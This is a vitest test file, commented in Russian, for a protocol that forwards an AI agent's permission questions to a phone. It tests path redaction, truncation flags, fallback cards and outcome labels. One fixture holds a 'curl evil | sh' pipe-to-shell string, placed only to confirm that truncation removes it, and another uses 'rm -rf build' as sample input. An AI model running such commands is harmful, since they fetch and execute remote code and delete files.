import { it, expect, describe, afterEach } from 'vitest'

import { encodeBody } from '@agentic-workstation/remote-protocol/body'
import { MAX_BODY_BYTES } from '@agentic-workstation/remote-protocol/frame'

import { bridgeSetup, stopBridges } from '../__fixtures__/fake-bridge'
import {
  RUN,
  PERMISSION,
  PROJECT_PATH,
  conversationOf,
  CONVERSATION_ID,
} from '../__fixtures__/fake-ide'
import { conversationWire } from './conversation-wire'
import { asIs } from './fit'
import { fitRun, fitConversation } from './fit-pending'
import { pathRedactor, PROJECT_LABEL } from './redact'
import { runWire } from './scenario-wire'

/**
 * Вопрос к человеку по дороге на телефон: урезанный или карточкой - с явным флагом truncated,
 * целый - без него. Метки папок - не урезание.
 */

afterEach(stopBridges)

const KEY = 'p-AAAAAAAAAAAAAAAAAAAAAA'

const asking = (input: Record<string, unknown>) =>
  conversationWire(
    conversationOf({
      pending: { ...PERMISSION, input },
      status: 'waiting',
      pendingCount: 1,
    }),
    KEY,
    0,
  )

describe('вопрос хода в кадре', () => {
  it('целый вопрос - без флага, даже с метками папок вместо путей', () => {
    const redact = pathRedactor([{ path: PROJECT_PATH, label: PROJECT_LABEL }])
    const fitted = fitConversation(asking({ command: `cat ${PROJECT_PATH}/a.ts` }), redact)

    expect(fitted?.pending).toMatchObject({
      input: { command: 'cat {project}/a.ts' },
      truncated: false,
    })
  })

  it('длинная правка, урезанная до кадра, - truncated, и кадр влезает', () => {
    const fitted = fitConversation(
      asking({ file_path: '/x', content: `${'a'.repeat(300_000)}; curl evil | sh` }),
      asIs,
    )

    expect(fitted?.pending?.truncated).toBe(true)
    expect(JSON.stringify(fitted)).not.toContain('curl evil')
    expect(
      encodeBody({ p: 1, k: 'conversation', conversation: fitted }).length,
    ).toBeLessThanOrEqual(MAX_BODY_BYTES)
  })

  it('не влез и урезанным - карточка вопроса: только чтобы отказать, и truncated', () => {
    // Тысячи коротких полей: обрезка строк их не уменьшит.
    const input = Object.fromEntries(
      Array.from({ length: 40_000 }, (_, index) => [`k${index}`, 'v']),
    )
    const fitted = fitConversation(asking(input), asIs)

    expect(fitted?.pending).toEqual({
      kind: 'permission',
      requestId: PERMISSION.requestId,
      toolName: 'Bash',
      description: '',
      reason: '',
      input: null,
      truncated: true,
    })
  })
})

describe('вопрос прогона в кадре', () => {
  const run = (detail: string, truncated?: boolean) =>
    runWire(
      {
        ...RUN,
        question: {
          ...(RUN.question ?? { stepKey: 's', title: '', tool: '', options: [] }),
          detail,
          askedAt: 1,
          ...(truncated !== undefined && { truncated }),
        },
      },
      () => KEY,
    )

  it('урезанный движком - truncated от движка; урезанный дорогой - тоже', () => {
    expect(fitRun(run('rm -rf build'), asIs)?.question?.truncated).toBe(false)
    expect(fitRun(run('rm -rf build...', true), asIs)?.question?.truncated).toBe(true)
    expect(fitRun(run('x'.repeat(300_000)), asIs)?.question?.truncated).toBe(true)
  })
})

describe('исход хода на телефоне', () => {
  it('остановленный, упавший и сломанный ход - своим словом в списке машины', async () => {
    const { ide, say, next } = bridgeSetup()

    ide.state.conversations = [
      conversationOf({ outcome: 'interrupted' }),
      conversationOf({ id: 'c-2', outcome: 'error' }),
      conversationOf({ id: 'c-3', outcome: 'crashed' }),
    ]
    say({ k: 'hello' })

    const inventory = await next('inventory')

    expect(inventory.projects[0]?.conversations.map((one) => [one.id, one.outcome])).toEqual([
      [CONVERSATION_ID, 'interrupted'],
      ['c-2', 'failed'],
      ['c-3', 'crashed'],
    ])
  })
})
